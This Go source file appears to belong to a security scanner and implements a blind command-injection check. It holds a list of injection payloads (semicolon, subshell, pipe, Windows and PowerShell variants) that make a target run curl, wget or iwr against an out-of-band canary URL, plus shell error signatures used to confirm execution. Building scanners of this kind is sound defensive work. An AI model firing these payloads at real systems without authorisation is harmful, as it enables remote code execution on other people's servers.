package lua_engine

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/londonmax12/hyperz/internal/httpclient"
	"github.com/londonmax12/hyperz/internal/oob"
)

// CmdInjectionBlind probes for OS command injection via error-based detection.
// Unlike the timing-based CmdInjection check, this targets scenarios where
// command execution is blind (output not directly visible) but errors from
// command execution leak into the response. Detects injection in contexts
// where timing-based approaches fail (cached responses, fixed latencies,
// suppressed delays).
//
// For each sink, the check sends payloads designed to trigger command
// execution failures (e.g. nonexistent commands, syntax errors) and scans
// the response body for shell error signatures ("command not found",
// "is not recognized", syntax errors, etc). A hit on both the injected
// command markers AND error patterns confirms RCE.
//
// Complements CmdInjection by catching blind RCE in different contexts:
// - Cached responses where timing can't be measured
// - Contexts where output is captured but not user-visible
// - Scenarios with suppressed error output in timing check
//
// Per sink: 1 probe per payload (fast on non-vulnerable sinks).
// With low overhead and no confirmation overhead, this runs efficiently
// alongside CmdInjection.
//
// Active (LevelDefault) check.
type CmdInjectionBlind struct{}

// cmdInjectionBlindOOBPayload describes one canary-fetching command
// injection. Tmpl carries a {{URL}} placeholder substituted with the
// canary URL before sending; the rest of the template is the shell
// metacharacter context (semicolon, subshell, pipe, Windows separator)
// that triggers execution in different host-command shapes.
type cmdInjectionBlindOOBPayload struct {
	Name string
	Tmpl string
}

// cmdInjectionBlindOOBPayloads is the curated list of canary-fetching
// command injections. One entry per distinct shell context (POSIX
// semicolon, subshell, pipe, AND chain, Windows cmd.exe, PowerShell)
// so a vulnerable sink fires the matching context without padding
// requests against non-vulnerable sinks. curl is preferred over wget
// because it is bundled with Windows 10+ and most modern Linux
// distributions; the wget fallback covers older POSIX hosts.
var cmdInjectionBlindOOBPayloads = []cmdInjectionBlindOOBPayload{
	// POSIX unquoted-arg context: `; curl URL` chains a new statement
	// onto the host command. The most common shell context.
	{Name: "semicolon-curl", Tmpl: `; curl {{URL}}`},
	// Subshell substitution variants: detonate inside double-quoted
	// shell arguments where bare ; / && get quoted out. Both kept
	// because legacy /bin/sh strips $() while bash strips nothing.
	{Name: "dollar-paren-curl", Tmpl: `$(curl {{URL}})`},
	{Name: "backtick-curl", Tmpl: "`curl {{URL}}`"},
	// Pipe variant: secondary unquoted-arg context that triggers some
	// sinks where the semicolon is parsed by a wrapping flag parser
	// before reaching the shell.
	{Name: "pipe-curl", Tmpl: `| curl {{URL}}`},
	// AND chain variant.
	{Name: "and-curl", Tmpl: `&& curl {{URL}}`},
	// wget fallback for hosts where curl is absent (older Debian /
	// minimal Alpine builds without the curl package).
	{Name: "semicolon-wget", Tmpl: `; wget -q -O- {{URL}}`},
	// Windows cmd.exe: `&` chains commands; Windows 10+ ships curl.
	{Name: "windows-curl", Tmpl: `& curl {{URL}}`},
	// PowerShell fallback for Windows hosts without curl on PATH or
	// for sinks that funnel into pwsh/powershell.exe directly.
	{Name: "windows-powershell-iwr", Tmpl: `& powershell -Command "iwr {{URL}}"`},
}

// probeOOB fires every OOB payload against sink, each carrying a
// distinct canary. The check does not emit a finding from this call;
// Drain translates listener-side hits into findings after the scanner's
// wait window elapses. Per-probe transport failures are reported but
// don't sink the others - a target may reject one payload's shape
// (e.g. backticks in a JSON body) while accepting another.
func (c CmdInjectionBlind) probeOOB(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, sink Sink) {
	anchor := sink.Value
	if anchor == "" {
		anchor = cmdInjectionFillerValue
	}
	for _, pld := range cmdInjectionBlindOOBPayloads {
		if ctx.Err() != nil {
			return
		}
		canary := srv.Register("cmd-injection-blind", map[string]string{
			"target":  target,
			"sink":    sink.Name,
			"loc":     string(sink.Loc),
			"method":  sink.Method,
			"payload": pld.Name,
		})
		wireValue := anchor + strings.ReplaceAll(pld.Tmpl, "{{URL}}", canary.HTTPURL)
		req, err := sink.MutateRequest(ctx, wireValue)
		if err != nil {
			Report(ctx, fmt.Errorf("cmd-injection-blind oob mutate %s %s=%s pl=%s: %w",
				sink.Loc, sink.Name, sink.URL, pld.Name, err))
			continue
		}
		resp, err := client.Do(ctx, req)
		if err != nil {
			Report(ctx, fmt.Errorf("cmd-injection-blind oob send %s %s=%s pl=%s: %w",
				sink.Loc, sink.Name, sink.URL, pld.Name, err))
			continue
		}
		// Drain a small chunk so the connection returns to the pool cleanly.
		// The response body has no signal here; the listener-side hit is.
		_, _, _ = httpclient.ReadBodyCapped(resp, 1<<10)
		_ = resp.Body.Close()
	}
}

// buildCmdInjectionBlindOOBFinding renders one OOB-confirmed RCE
// finding. Severity is Critical: an OOB callback proves the target
// executed an arbitrary command AND its egress reached the scanner,
// the strongest possible signal short of pulling a file off the box.
// The in-band error-based path tops out at Critical too, but on
// weaker evidence (reflected error string); the OOB finding stays
// distinct so reports can show both when both fire.
func buildCmdInjectionBlindOOBFinding(reg oob.Registration, hits []oob.Hit) Finding {
	target := reg.Extra["target"]
	sink := reg.Extra["sink"]
	loc := reg.Extra["loc"]
	method := reg.Extra["method"]
	payload := reg.Extra["payload"]
	hit := hits[0]
	ua := hit.Headers.Get("User-Agent")
	return Finding{
		Check:    "cmd-injection-blind",
		Target:   target,
		URL:      target,
		Severity: SeverityCritical,
		Title:    fmt.Sprintf("Blind OS command injection (OOB-confirmed) in %s parameter %q", loc, sink),
		Detail: fmt.Sprintf(
			"Parameter %q (%s) is concatenated into a shell command. "+
				"Payload cmd-injection-blind/%s with canary %s caused the target to issue an outbound "+
				"HTTP request that landed on the OOB listener (method=%s, source=%s, user-agent=%q, %d hit(s)). "+
				"This proves the parameter both reached the shell AND the resulting command executed - the target "+
				"is vulnerable to blind RCE, with confirmed egress to attacker-controlled hosts.",
			sink, loc, payload, reg.Canary.HTTPURL, hit.Method, hit.SourceAddr, ua, len(hits)),
		CWE:   "CWE-78",
		OWASP: "A03:2021 Injection",
		Remediation: "Never pass user input to a shell. Use the language's exec API that takes an argv slice " +
			"(e.g. Go's exec.Command(name, args...), Python's subprocess with shell=False) so arguments are passed as " +
			"separate elements rather than concatenated into a shell-parsed string. When a shell is unavoidable, " +
			"strictly allowlist the permitted argument shape - blocklists of metacharacters are routinely bypassed.",
		Evidence: &Evidence{
			Method:     method,
			RequestURL: target,
			Snippet: fmt.Sprintf(
				"Payload: cmd-injection-blind/%s\nCanary URL: %s\nFirst hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
				payload, reg.Canary.HTTPURL,
				hit.Method, hit.Path, hit.SourceAddr,
				hit.Timestamp.Format(time.RFC3339), ua, len(hits)),
		},
		DedupeKey: MakeKey("cmd-injection-blind", ScopeParam, target, "loc:"+loc, "param:"+sink, "oob"),
	}
}

// probe dispatches error-based payloads for one sink. Returns a finding
// if a payload triggers both the injected command marker and error signatures.
func (c CmdInjectionBlind) probe(ctx context.Context, client *httpclient.Client, target string, sink Sink) (*Finding, error) {
	anchor := sink.Value
	if anchor == "" {
		anchor = cmdInjectionFillerValue
	}

	canary := NewCanary()
	for _, p := range PayloadsFor(PayloadCmdInjectBlind) {
		if ctx.Err() != nil {
			break
		}
		wireValue := anchor + p.Render(canary, 0)

		req, err := sink.MutateRequest(ctx, wireValue)
		if err != nil {
			Report(ctx, fmt.Errorf("cmd-injection-blind mutate %s %s=%s pl=%s: %w",
				sink.Loc, sink.Name, sink.URL, p.Name, err))
			continue
		}

		resp, err := client.Do(ctx, req)
		if err != nil {
			Report(ctx, fmt.Errorf("cmd-injection-blind send %s %s=%s pl=%s: %w",
				sink.Loc, sink.Name, sink.URL, p.Name, err))
			continue
		}
		defer resp.Body.Close()

		body, truncated, err := httpclient.ReadBodyCapped(resp, cmdInjectionBodyCap)
		if err != nil {
			Report(ctx, fmt.Errorf("cmd-injection-blind read %s %s=%s pl=%s: %w",
				sink.Loc, sink.Name, sink.URL, p.Name, err))
			continue
		}

		// Match both: the injected canary (proves injection) AND error patterns
		// (proves execution). Both conditions must fire to avoid false positives
		// from unrelated errors in the page.
		bodyStr := strings.ToLower(string(body))
		if !strings.Contains(bodyStr, strings.ToLower(canary)) {
			continue
		}

		matchedError := ""
		for _, errSig := range CmdErrorPatterns() {
			if strings.Contains(bodyStr, errSig) {
				matchedError = errSig
				break
			}
		}
		if matchedError == "" {
			continue
		}

		probeURL := ""
		method := ""
		if req != nil {
			method = req.Method
			if req.URL != nil {
				probeURL = req.URL.String()
			}
		}
		status := statusOf(resp)

		return &Finding{
			Check:    "cmd-injection-blind",
			Target:   target,
			URL:      probeURL,
			Severity: SeverityCritical,
			Title:    fmt.Sprintf("Blind OS command injection in %s parameter %q", sink.Loc, sink.Name),
			Detail: fmt.Sprintf(
				"Parameter %q (%s) is concatenated into a shell command. "+
					"Payload cmd-injection-blind/%s with canary %q triggered both the injected canary "+
					"(confirming injection reached execution context) and error signature %q (confirming command execution). "+
					"The application is vulnerable to blind RCE: an attacker can execute arbitrary OS commands as the web server process, "+
					"enabling filesystem read/write, network reconnaissance, or full system compromise.",
				sink.Name, sink.Loc, p.Name, canary, matchedError),
			CWE:   "CWE-78",
			OWASP: "A03:2021 Injection",
			Remediation: "Never pass user input to a shell. Use the language's exec API that takes an argv slice " +
				"(e.g. Go's exec.Command(name, args...), Python's subprocess with shell=False) so arguments are passed as " +
				"separate elements rather than concatenated into a shell-parsed string. When a shell is unavoidable, " +
				"strictly allowlist the permitted argument shape - blocklists of metacharacters are routinely bypassed.",
			Evidence: &Evidence{
				Method:     method,
				RequestURL: probeURL,
				Status:     status,
				Snippet:    fmt.Sprintf("canary=%q error-signature=%q", canary, matchedError),
				Exchange:   RecordExchange(req, nil, false, resp, body, truncated),
			},
			DedupeKey: MakeKey("cmd-injection-blind", ScopeParam, target, "loc:"+string(sink.Loc), "param:"+sink.Name),
		}, nil
	}
	return nil, nil
}

// CmdErrorPatterns returns shell error signatures that indicate command
// execution. Patterns are lowercase and matched against a lowercased response
// body. When found in a response alongside an injected canary, they confirm
// blind RCE. Curated to cover POSIX shells and Windows cmd.exe.
func CmdErrorPatterns() []string {
	return []string{
		// POSIX shells: command not found is the most reliable signal
		"command not found",
		"not found: command",
		// bash-specific
		": not found",
		"bad substitution",
		"command substitution: line",
		// zsh
		"command not found:",
		// Broader POSIX syntax errors
		"syntax error",
		"unexpected token",
		"unexpected operator",
		// Windows cmd.exe
		"is not recognized as an internal or external command",
		"'\\' is not recognized",
		"cannot find the path specified",
		// PowerShell
		"is not recognized as the name of a cmdlet",
		"is not recognized as the name of",
		"object reference not set to an instance",
		// Generic shell indicators
		"bash: ",
		"sh: ",
		"/bin/sh: ",
		"permission denied",
		"no such file or directory",
	}
}
